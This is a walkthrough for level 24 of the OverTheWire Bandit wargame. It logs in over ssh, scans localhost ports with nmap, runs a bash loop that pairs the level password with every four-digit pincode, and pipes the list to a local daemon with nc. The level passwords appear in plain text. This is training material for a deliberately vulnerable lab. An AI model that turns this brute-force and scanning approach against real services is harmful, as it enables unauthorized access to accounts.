# Bandit Level 24 → Level 25

## Level Goal
A daemon is listening on port 30002 and will give you the password for bandit25 if given the password for bandit24 and a secret numeric 4-digit pincode. There is no way to retrieve the pincode except by going through all of the 10000 combinations, called brute-forcing.

## Solution
Brute Force attack is a cryptographic hack. Also known as an Exhaustive Search, it relies on calculating and submitting every possible password combination with the hope of eventually guessing correctly. The attacker systematically checks all possible passwords and passphrases until the correct one is found.

```                                                                                
┌──(kali㉿kali)-[~]
└─$ ssh -p 2220 bandit24@bandit.labs.overthewire.org
```

This is a OverTheWire game server. More information on http://www.overthewire.org/wargames

```
bandit24@bandit.labs.overthewire.org's password: UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
```

Linux bandit.otw.local 5.4.8 x86_64 GNU/Linux
```
      ,----..            ,----,          .---.
     /   /   \         ,/   .`|         /. ./|
    /   .     :      ,`   .'  :     .--'.  ' ;
   .   /   ;.  \   ;    ;     /    /__./ \ : |
  .   ;   /  ` ; .'___,/    ,' .--'.  '   \' .
  ;   |  ; \ ; | |    :     | /___/ \ |    ' '
  |   :  | ; | ' ;    |.';  ; ;   \  \;      :
  .   |  ' ' ' : `----'  |  |  \   ;  `      |
  '   ;  \; /  |     '   :  ;   .   \    .\  ;
   \   \  ',  /      |   |  '    \   \   ' \ |
    ;   :    /       '   :  |     :   '  |--"
     \   \ .'        ;   |.'       \   \ ;
  www. `---` ver     '---' he       '---" ire.org
```

Welcome to OverTheWire!

If you find any problems, please report them to Steven or morla on
irc.overthewire.org.

--[ Playing the games ]--

  This machine might hold several wargames.
  If you are playing "somegame", then:

    * USERNAMES are somegame0, somegame1, ...
    * Most LEVELS are stored in /somegame/.
    * PASSWORDS for each level are stored in /etc/somegame_pass/.

  Write-access to homedirectories is disabled. It is advised to create a
  working directory with a hard-to-guess name in /tmp/.  You can use the
  command "mktemp -d" in order to generate a random and hard to guess
  directory in /tmp/.  Read-access to both /tmp/ and /proc/ is disabled
  so that users can not snoop on eachother. Files and directories with
  easily guessable or short names will be periodically deleted!

  Please play nice:

    * don't leave orphan processes running
    * don't leave exploit-files laying around
    * don't annoy other players
    * don't post passwords or spoilers
    * again, DONT POST SPOILERS!
      This includes writeups of your solution on your blog or website!

--[ Tips ]--

  This machine has a 64bit processor and many security-features enabled
  by default, although ASLR has been switched off.  The following
  compiler flags might be interesting:

    -m32                    compile for 32bit
    -fno-stack-protector    disable ProPolice
    -Wl,-z,norelro          disable relro

  In addition, the execstack tool can be used to flag the stack as
  executable on ELF binaries.

  Finally, network-access is limited for most levels by a local
  firewall.

--[ Tools ]--

 For your convenience we have installed a few usefull tools which you can find
 in the following locations:

    * gef (https://github.com/hugsy/gef) in /usr/local/gef/
    * pwndbg (https://github.com/pwndbg/pwndbg) in /usr/local/pwndbg/
    * peda (https://github.com/longld/peda.git) in /usr/local/peda/
    * gdbinit (https://github.com/gdbinit/Gdbinit) in /usr/local/gdbinit/
    * pwntools (https://github.com/Gallopsled/pwntools)
    * radare2 (http://www.radare.org/)
    * checksec.sh (http://www.trapkit.de/tools/checksec.html) in /usr/local/bin/checksec.sh

--[ More information ]--

  For more information regarding individual wargames, visit
  http://www.overthewire.org/wargames/

  For support, questions or comments, contact us through IRC on
  irc.overthewire.org #wargames.

  Enjoy your stay!

```
bandit24@bandit:~$ nmap -p- localhost                             #to check if localhost is listening at 30002
                                                                  #you can specify -p- to scan ports from 1 through 65535
Starting Nmap 7.40 ( https://nmap.org ) at 2022-02-11 10:11 CET
Nmap scan report for localhost (127.0.0.1)
Host is up (0.00026s latency).
Not shown: 65524 closed ports
PORT      STATE SERVICE
22/tcp    open  ssh
113/tcp   open  ident
1234/tcp  open  hotline
30000/tcp open  ndmps
30001/tcp open  pago-services1
30002/tcp open  pago-services2                                    #the localhost is listening at 30002
31046/tcp open  unknown
31518/tcp open  unknown
31691/tcp open  unknown
31790/tcp open  unknown
31960/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 3.53 seconds
```
### Note1: In the challenge it is told that along with the password for bandit24, a 4 digit passcode (obtained using brute-force) should be produced to the localhost through port 30002. So write a script to append the 4 digit passcode with the bandit24 password. This script is written in the file basefile.sh and the final password appended with passcode is redirected to the file combinations.txt.

```
bandit24@bandit:~$ mkdir /tmp/dirbandit24                            #create a directory dirbandit24 under temp

bandit24@bandit:~$ cd /tmp/dirbandit24                               #navigate to dirbandit24

bandit24@bandit:/tmp/dirbandit24$ vim basefile.sh                    #create and open a file named basefile.sh using vim
                                                                     #press i for insert mode in vim
                                                                     #type the below script in it
                                                                     #!/bin/bash
                                                                     #for i in {0000..9999};
                                                                     #    do
                                                                     #        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> combinations.txt
                                                                     #    done
    
                                                                     #press Esc to get into command mode
                                                                     #run :wq to save and close the vim


bandit24@bandit:/tmp/dirbandit24$ cat basefile.sh                    #read the created file to verify its contents 
#!/bin/bash

for i in {0000..9999};                                                        #generate 0000 to 9999, each digit in each iteration                                                                     
    do
        echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ" $i >> combinations.txt        #append the generated passcode with bandit24 password and redirect it to the file combinations.txt in each iteration
    done
    
bandit24@bandit:/tmp/dirbandit24$ chmod +x basefile.sh                 #provide execute permission for basefile.sh

bandit24@bandit:/tmp/dirbandit24$ ./basefile.sh                        #execute the file basefile.sh

bandit24@bandit:/tmp/dirbandit24$ head -n 5 combinations.txt           #to see the first 5 entries of combinations.txt
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0000
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0001
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0002
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0003
UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 0004
```
### Note2: Send the contents of the file to localhost at port 30002, which inturn will produce the password to the next level when the correct passcode is received. This output is redirected to result.txt file.
```
bandit24@bandit:/tmp/dirbandit24$ cat combinations.txt | nc localhost 30002 >> result.txt   

bandit24@bandit:/tmp/dirbandit24$ sort result.txt | uniq -u            #since there is only one passcode that can provide the password, sort and find the unique output

Correct!
Exiting.
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
The password of user bandit25 is uNG9O58gUE7snukf3bvZ0rxhtnjzSGzG

bandit24@bandit:/tmp/dirbandit24$ rm -rf /tmp/dirbandit24              #delete the created directory

bandit24@bandit:/tmp/dirbandit24$ exit                                 #logout of bandit.labs.overthewire.org
logout
Connection to bandit.labs.overthewire.org closed.
```                  
#### vim text editor
```
vim            -> Open vim
vim <fileName> -> Open file using vim or create and open the file with vim
i              -> Switch to insert mode & Enter some text
Esc            -> Switch back to command mode
:w             -> Save changes to file
:q             -> Quit Vim
```
